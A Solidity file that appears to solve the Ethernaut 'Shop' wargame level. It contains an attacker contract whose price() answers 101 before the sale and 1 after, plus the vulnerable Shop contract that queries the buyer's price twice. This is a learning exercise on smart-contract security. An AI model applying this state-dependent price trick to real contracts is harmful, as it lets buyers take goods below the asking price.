// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title 21. STOP
 * @dev Get the item from the shop for less than the price asked.
 */

contract Etherenaut_Shop {
    Buyer buyer = Buyer(0xb6fD536610887837a3452Ac249432bF9eF129e3a); // Replace with your Shop instance

    // Custom price() function implementation
    function price() public view returns (uint256) {
        bool sold = buyer.isSold();

        if (!sold) {
            return 101; // 1. Let's start by bying the item for 101
        } else {
            return 1; // 2. Then set the price to 1 :)
        }
    }

    function attack() public {
        buyer.buy();
    }
}

// 🎉 Level completed! 🎉

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

interface Buyer {
    function isSold() external view returns (bool);

    function price() external view returns (uint256);

    function buy() external;
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
